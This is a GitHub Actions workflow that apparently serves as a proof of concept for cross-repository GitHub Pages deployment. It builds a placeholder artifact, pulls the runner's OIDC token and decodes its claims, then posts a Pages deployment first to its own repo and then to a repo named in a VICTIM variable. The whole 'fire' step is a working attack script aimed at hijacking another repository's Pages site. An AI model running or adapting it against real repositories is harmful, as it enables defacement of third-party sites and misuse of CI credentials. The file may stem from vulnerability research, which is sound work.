name: xrepo
on: [push, workflow_dispatch]
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p _site && echo "<h1>ARTIFACT-FROM-REPO-A</h1>" > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with:
          path: _site
      - name: fire
        env:
          GHT: ${{ github.token }}
          REPO: ${{ github.repository }}
          RUNID: ${{ github.run_id }}
          SHA: ${{ github.sha }}
          VICTIM: mr-benty/rationale-sink-0802
        run: |
          set +e
          curl -s -H "Authorization: Bearer $GHT" "https://api.github.com/repos/$REPO/actions/runs/$RUNID/artifacts" -o /tmp/a.json
          export ART=$(python3 -c "import json;a=json.load(open('/tmp/a.json'))['artifacts'];print(a[0]['id'] if a else '')")
          echo "ARTIFACT_ID=$ART"
          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" -o /tmp/t.json
          TOK=$(python3 -c "import json;print(json.load(open('/tmp/t.json'))['value'])")
          echo "$TOK" | cut -d. -f2 > /tmp/c.b64
          python3 -c "import base64,json;s=open('/tmp/c.b64').read().strip();s+='='*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print('CLAIM_REPO='+str(d.get('repository')));print('CLAIM_AUD='+str(d.get('aud')));print('CLAIM_SUB='+str(d.get('sub')))"
          python3 -c "import json,os;print(json.dumps({'artifact_id':int(os.environ['ART']),'pages_build_version':os.environ['SHA'],'oidc_token':open('/tmp/t.json').read() and json.load(open('/tmp/t.json'))['value']}))" > /tmp/body.json
          echo "=== CONTROL same-repo ==="
          curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $GHT" -H "Accept: application/vnd.github+json" -d @/tmp/body.json "https://api.github.com/repos/$REPO/pages/deployments"
          echo "=== TEST cross-repo ==="
          curl -s -w "\nHTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $GHT" -H "Accept: application/vnd.github+json" -d @/tmp/body.json "https://api.github.com/repos/$VICTIM/pages/deployments"
        continue-on-error: true
